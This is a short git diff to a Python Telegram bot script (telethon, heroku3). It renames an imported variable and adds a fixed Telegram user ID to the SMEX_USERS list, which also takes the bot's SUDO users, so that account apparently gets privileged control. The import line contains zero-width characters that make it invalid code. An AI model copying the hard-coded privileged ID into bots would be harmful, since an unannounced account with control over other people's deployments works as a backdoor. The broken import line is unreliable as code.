@@ -4,7 +4,7 @@ import git
 import random
 import heroku3
 from datetime import datetime
-from​ .. ​import str, ​DEV​, ​HEROKU_APP_NAME​, ​HEROKU_API_KEY
+from​ .. ​import str1, ​DEV​, ​HEROKU_APP_NAME​, ​HEROKU_API_KEY
 from .. import CMD_HNDLR as hl
 from os import execl
 from telethon import TelegramClient, events
@@ -88,7 +88,7 @@ str30 = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [5046719296]
 for x in SUDO:
     SMEX_USERS.append(x)
     
